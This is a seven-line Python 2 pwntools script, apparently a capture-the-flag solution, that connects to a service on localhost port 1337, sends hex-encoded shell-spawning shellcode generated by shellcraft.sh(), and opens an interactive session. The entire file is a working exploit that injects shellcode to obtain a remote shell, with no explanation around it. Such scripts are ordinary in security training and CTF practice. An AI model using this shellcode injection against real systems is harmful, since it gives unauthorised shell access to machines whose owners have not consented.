#!/usr/bin/env python2

from pwn import *

r = remote("localhost", 1337)
r.sendline(asm(shellcraft.sh()).encode("hex"))
r.interactive()
